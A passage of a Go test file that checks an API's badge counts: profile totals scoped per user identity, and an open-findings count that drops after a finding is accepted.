		require.Equal(t, len(profiles.Profiles), badges.Profiles,
			"the badge and the list must be the same set for %s", who.claims.Email)
	}

	// The negative control: the three identities do not all read the same number,
	// so the assertion above is about scoping and not about one shared total.
	broad := getJSON[contract.Badges](t, handler, kw.token, "/v1/badges")
	narrow := getJSON[contract.Badges](t, handler, contractor.token, "/v1/badges")
	require.Greater(t, broad.Profiles, narrow.Profiles)
}

func TestTheOpenFindingsBadgeCountsOnlyTheOnesAwaitingADecision(t *testing.T) {
	handler := liveHandler(t)

	before := getJSON[contract.Badges](t, handler, kw.token, "/v1/badges")
	fixture := seedGovernance(t)

	after := getJSON[contract.Badges](t, handler, kw.token, "/v1/badges")
	require.Equal(t, before.OpenFindings+2, after.OpenFindings,
		"three findings were added and one of them is already accepted")

	accept := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/accept", an.token, `{"note":"accepted"}`)
	require.Equal(t, http.StatusOK, accept.Code, accept.Body.String())

	decided := getJSON[contract.Badges](t, handler, kw.token, "/v1/badges")
	require.Equal(t, after.OpenFindings-1, decided.OpenFindings,
		"a decision must move the badge, or the badge is not reading the state the decision wrote")
}
